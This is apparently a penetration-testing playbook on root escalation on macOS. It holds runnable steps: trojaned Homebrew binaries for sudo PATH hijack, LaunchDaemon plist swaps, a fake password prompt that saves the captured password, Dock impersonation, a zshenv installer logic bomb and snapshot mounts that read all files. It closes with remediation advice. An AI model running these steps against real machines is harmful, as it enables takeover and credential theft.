---
name: performing-macos-privilege-escalation
description: Escalating from a low-privileged user (or unprivileged process) to root on macOS during authorized engagements
  by abusing the user-preserved sudo PATH, Dock/app masquerading, sudo-password phishing, AuthorizationExecuteWithPrivileges
  helpers, vulnerable privileged XPC/LaunchDaemon helpers, writable LaunchDaemon plists, PackageKit/zsh logic bombs,
  kernel credential races, and Time Machine snapshot mounts.
domain: cybersecurity
subdomain: macos-security
tags:
- penetration-testing
- macos
- privilege-escalation
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
---

# Performing macOS Privilege Escalation

## When to Use

- During authorized macOS assessments after gaining initial code execution as a standard user
- When a privileged helper, LaunchDaemon, or third-party updater is present and may expose a root-reachable interface
- When you can social-engineer a desktop user (Dock impersonation, fake password prompts) for a sudo-capable credential
- When evaluating SIP-bypass chains for persistence in protected system locations
- Note that most Linux/Unix privesc tricks (sudo misconfig, writable PATH binaries) also apply to macOS

## Critical: Techniques Most Often Missed

### 1. sudo keeps the user PATH (Homebrew binary hijack)

Unlike Linux, macOS **preserves the user's `PATH` across `sudo`**. If `/opt/homebrew/bin` (Homebrew, almost always present on developer Macs) precedes system paths, you can plant a trojaned `ls`, `git`, etc. and wait for the victim to run `sudo <binary>`.

```bash
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
[ "$(id -u)" -eq 0 ] && whoami > /tmp/privesc
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls
# wait for: sudo ls
```

**How to CONFIRM:** run `echo $PATH` and verify a user-writable dir precedes `/usr/bin`; check `sudo env | grep PATH` retains it; confirm the planted binary fires as root (`/tmp/privesc` contains `root`).

### 2. Vulnerable privileged XPC / LaunchDaemon helpers

The dominant third-party privesc class: a **root LaunchDaemon** exposes a Mach/XPC service from `/Library/PrivilegedHelperTools` that fails to validate the client, validates too late (PID race), or runs a user-controlled path/script.

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

**How to CONFIRM:** the helper accepts requests after uninstall (job still loaded), reads scripts/config from non-root-writable `/Applications/...`, or relies on PID/bundle-id-only peer validation (raceable).

### 3. Writable LaunchDaemon plist / target → root (CVE-2025-24085 pattern)

If a LaunchDaemon plist or its `ProgramArguments` target is user-writable, swap it and force `launchd` to reload.

```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor && chmod 755 /Library/PrivilegedHelperTools/securemonitor
# rewrite the plist ProgramArguments to your binary, then:
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```

**How to CONFIRM:** `ls -l` the plist and target binary for group/other write or user ownership; after reload, your payload runs as `uid 0`.

## Workflow

### Step 1: Enumerate the user, sudo rights, and PATH

```bash
whoami; id; groups
sudo -l 2>/dev/null            # cached/allowed sudo commands
echo $PATH                     # look for writable dirs before /usr/bin
ls -ld /opt/homebrew/bin /usr/local/bin   # writable Homebrew paths
dscl . -read /Groups/admin GroupMembership # who is admin
```

### Step 2: Hunt privileged helpers and writable autostart targets

```bash
ls -l@ /Library/LaunchDaemons /Library/LaunchAgents
ls -l /Library/PrivilegedHelperTools
# find world/group-writable plists or targets owned by non-root
find /Library/LaunchDaemons -perm -0002 -o -perm -0020 2>/dev/null
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'  # catch helper calls
```

### Step 3: Social-engineering / credential capture (when a GUI user is present)

`AuthorizationExecuteWithPrivileges` is deprecated but still works on Sonoma/Sequoia. Many updaters invoke `/usr/libexec/security_authtrampoline` with an untrusted path — plant a payload at a user-writable helper and ride the legitimate root prompt. You can also masquerade as Chrome/Finder in the Dock or loop a password prompt validated with `dscl`:

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break    # validates without sudo
done
printf '%s\n' "$pw" > /tmp/.pass
# reuse non-interactively: clear quarantine, copy LaunchDaemons, etc.
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update
```

Dock impersonation: copy a real app's `.icns`, build a fake `Google Chrome.app`/`Finder.app`, then `defaults write com.apple.dock persistent-apps -array-add '<...>' && killall Dock`.

### Step 4: Abuse installer / package logic bombs

Pre-fix (Sonoma 14.5 / Ventura 13.6.7 / Monterey 12.7.5) `Installer.app`/PackageKit ran PKG scripts as root in the user's environment — a `#!/bin/zsh` installer sources the attacker's `~/.zshenv` as root (CVE-2024-27822 family).

```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg
echo 'id > /tmp/pkg-root' >> ~/.zshenv   # logic bomb; fires on next vulnerable zsh installer
```

### Step 5: Kernel and SIP-class escalation (advanced)

- **kauth credential race (CVE-2025-24118):** race `setgid()`/`getgid()` loops across threads to tear `proc_ro.p_ucred` → `uid 0` and kernel memory access.
- **NSPredicate XPC abuse:** Apple daemons (`coreduetd`, `contextstored`) that deserialize predicates and only validate `expressionType` can be driven to execute arbitrary selectors as root.
- **Migraine (CVE-2023-32369):** with root, abuse `systemmigrationd`'s `com.apple.rootless.install.heritable` to patch SIP-protected paths.

### Step 6: Read all files via Time Machine snapshot

Any user can mount a local snapshot `noowners` and read every file (the app, e.g. Terminal, needs Full Disk Access).

```bash
tmutil localsnapshot
tmutil listlocalsnapshots /
mkdir /tmp/snap
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.<date>.local /System/Volumes/Data /tmp/snap
ls /tmp/snap/Users/admin_user
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **sudo PATH preservation** | macOS keeps the user's `PATH` under `sudo`, enabling binary hijack in writable dirs like `/opt/homebrew/bin` |
| **Privileged helper** | Root daemon in `/Library/PrivilegedHelperTools` exposing an XPC/Mach service; weak client validation = privesc |
| **AuthorizationExecuteWithPrivileges** | Deprecated but functional root-spawn API; abused via `security_authtrampoline` and writable helper paths |
| **SIP** | System Integrity Protection; blocks even root from writing `/System`, `/bin`, `/usr` unless an entitlement bypass exists |
| **TCC** | Privacy gate (FDA, camera, etc.); a captured password/FDA app expands reach |
| **PackageKit logic bomb** | PKG post-install scripts that source `~/.zshenv`/`~/.zshrc` as root |
| **PID race / responsible process** | Time-of-check/time-of-use weakness in XPC peer validation |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **codesign** | Inspect helper signatures, TeamID, and entitlements (`-dvv --entitlements :-`) |
| **plutil** | Parse/print LaunchDaemon and preference plists |
| **launchctl** | bootout/bootstrap/load daemons to trigger swapped plists |
| **dscl** | Validate passwords (`-authonly`), enumerate users/groups/admins |
| **pkgutil** | Expand PKG installers to inspect pre/postinstall scripts |
| **log stream/show** | Observe `security_authtrampoline` and daemon activity |
| **tmutil / mount_apfs** | Create and mount Time Machine snapshots for full file read |

## Common Scenarios

### Scenario 1: Homebrew PATH hijack
A developer's `$PATH` lists `/opt/homebrew/bin` first. Planting a trojan `git` there runs as root the next time the user types `sudo git ...`.

### Scenario 2: Vulnerable VPN/updater helper
A VPN client ships a root LaunchDaemon whose XPC method runs a script from a user-writable `/Applications/...` path. Replacing the script yields root code execution without a prompt.

### Scenario 3: Writable LaunchDaemon plist
A misconfigured third-party daemon plist is group-writable. Rewriting `ProgramArguments` and reloading with `launchctl bootstrap system` executes the payload as root on reboot.

### Scenario 4: zsh installer logic bomb
The attacker drops `id > /tmp/pkg-root` into `~/.zshenv` and waits; when the user installs any vulnerable zsh-based PKG, the line runs as root.

## Output Format

```
## macOS Privilege Escalation Finding

**Vulnerability**: Local Privilege Escalation to root
**Severity**: High (CVSS 7.8)
**Technique**: Writable privileged helper / sudo PATH hijack / PackageKit logic bomb
**Host**: macHost.local (macOS 14.4, SIP enabled)

### Reproduction Steps
1. As user `staff`, enumerate helpers: ls -l /Library/PrivilegedHelperTools
2. Identify com.vendor.helper running script from user-writable /Applications/Vendor/run.sh
3. Replace run.sh payload; trigger helper via its XPC client
4. Confirm: id returns uid=0(root)

### Evidence
| Artifact | Detail |
|----------|--------|
| Helper | /Library/PrivilegedHelperTools/com.vendor.helper |
| Trigger | XPC method runHelperScript: |
| Proof | /tmp/privesc contains "root" |

### Recommendation
1. Validate XPC peers by audit token + code-signing requirement, not PID/bundle-id
2. Store helper scripts in root-owned, non-user-writable locations
3. Set LaunchDaemon plists and targets to root:wheel 644/755
4. Sign installers and avoid zsh/bash post-install scripts; patch to fixed macOS builds
5. Restrict admin group membership and audit Homebrew PATH ordering
```
